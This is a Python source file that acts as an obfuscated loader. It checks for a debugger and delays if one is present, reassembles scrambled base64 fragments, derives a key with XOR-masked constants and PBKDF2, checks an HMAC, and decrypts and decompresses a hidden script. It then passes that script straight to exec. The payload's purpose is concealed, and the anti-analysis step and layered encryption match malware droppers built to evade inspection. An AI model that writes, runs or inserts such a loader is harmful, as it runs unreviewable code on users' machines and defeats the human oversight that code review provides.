import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_e8f65a_0 = 'FECT31yDwqss48MnB9oz3nCYmxz5DUUZIbfKkczvw1URRWiK0'
_e8f65a_1 = 'a+yB2df4v0MZmLlaTVz7q6Yp0CvePu40bkIO5eIDtOQyNABF3'
_e8f65a_2 = 'JCwPSq9aa2brBBjOHhqU8fG'
_e8f65a_3 = 'DtHldVy6exCBbrLWefoQBMBMchhePIxX+RASd68gkpw3Ejw'
_e8f65a_4 = '3dVNz9LWp+hEw5plPv24Bq27Zr3U8KgBnZgOkn8Lqfs4Ljdi4NR'
_e8f65a_5 = 'gd3FuquNXpWI1Uf/EkNG8xrZXWbR0v5KHn4qVlvsvDsidb/iJ6d38OStt'
_e8f65a_6 = 'Vr9EAujT2IQxh/BqMFg189tSTa87IVVxd4oRkpMtM5YY+OT/zexi0ze8Dcj'
_e8f65a_7 = '5BmOZjoCBbc8DXCK8ovnzuiOU73MC+lE1xxqdYBsJTZfFlSnFpxNslxD'
_e8f65a_8 = 'D4GlFWdiDHKbsywCeLX6Oa52SWK'
_e8f65a_9 = 'MGsTpqJVFONXj0yWB6B72X77s'
_e8f65a_10 = '285RforYwEff0bGw2l6DIrYgb+XOsbdb69DpV10rLWpjoV8Z8u'
_e8f65a_11 = 'Chb+GubbGPpRM0dZmMH0yI9CH9rr+PD3oIZEvBP5xjrS7t8Iah08xrXbDy3c'
_e8f65a_12 = '26JUuJ2jfsHNIChuwmPwEYEDqoWFVKzNs9YPqfWymUkaZee9'
_e8f65a_13 = 'Lu9WYLfKOX++1y8rPsrslsReutKdn9bWHdyA4E6'
_e8f65a_14 = 'jO0TfevLT9iEbCPmlSFGJ+RJC/gpUx5yi3EK+Fy'
_e8f65a_15 = 'mRRsygFuV+pt2yMAWZj1JRfIneEmaGJLFWKIonfGcUlkU'
_e8f65a_16 = '8k4l7xwyM9zkGZKlz46Hq1pim7lOiIquRi5lhdJdKKblUfFQZtNYZ2Q'
_e8f65a_17 = 'LLl4w3AxpwGhS/+MfEy8F1TPeLbklO'
_e8f65a_18 = 'fSs5tKYpmtflonUMP+5zHnjge2cgqFli1OfvtBN20GWtgcVNwo2N1Ffz3'
_e8f65a_19 = 'NI+P23557nNVEbtMjY427H4fdzN3I39'
_e8f65a_20 = '8pg71V6JXlGYJfSGRgvtOzA1+1'
_e8f65a_21 = 'mBb0a1KHTvD2EuABGFlyNLs'
_e8f65a_22 = 'hpJmQ7fOn0S8IAaoGE/E+ntFEiDd8Pl40oa5Rc'
_pls = [_e8f65a_0, _e8f65a_1, _e8f65a_2, _e8f65a_3, _e8f65a_4, _e8f65a_5, _e8f65a_6, _e8f65a_7, _e8f65a_8, _e8f65a_9, _e8f65a_10, _e8f65a_11, _e8f65a_12, _e8f65a_13, _e8f65a_14, _e8f65a_15, _e8f65a_16, _e8f65a_17, _e8f65a_18, _e8f65a_19, _e8f65a_20, _e8f65a_21, _e8f65a_22]
_8d02d8 = [(54016,60310,2),(2920,64784,2),(36848,44379,2),(33660,423,2),(25916,42573,2),(36660,25471,2),(12306,35330,2),(24798,15663,2),(64287,58906,2),(53963,29394,2),(19848,18888,2),(64142,16647,2),(21905,35820,2),(13649,46150,2),(29433,31916,2),(46989,25218,2),(0,0,0),(0,0,0)]
_93c604 = 'OJb2eA=='
_aad54e = 'MFzKLIXaIdnYD5nk'
_91c8d6 = '12pE+dC2+ow='
_656d52 = [7, 3, 1, 2, 17, 13, 9, 10, 12, 22, 18, 21, 0, 19, 20, 15, 5, 8, 6, 11, 14, 16, 4]
_salt = base64.b64decode(_91c8d6)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _656d52
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_d11be8 = base64.b64decode(_assembled)
_aecb8f = 32
_b62391 = _d11be8[:-_aecb8f]
_aecb8f = _d11be8[-_aecb8f:]
_a9ceb4 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_8d02d8)
_hdr = base64.b64decode(_93c604)
_nonce = base64.b64decode(_aad54e)
_km_seed = hashlib.sha256(_a9ceb4 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _b62391, hashlib.sha256).digest()
if _calc_tag != _aecb8f:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_b62391)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_b62391, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_07f7d5'] = mmap
globals()['_162a5e'] = lambda i: globals()['_07f7d5'][str(i)]
_x = globals()['_162a5e']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
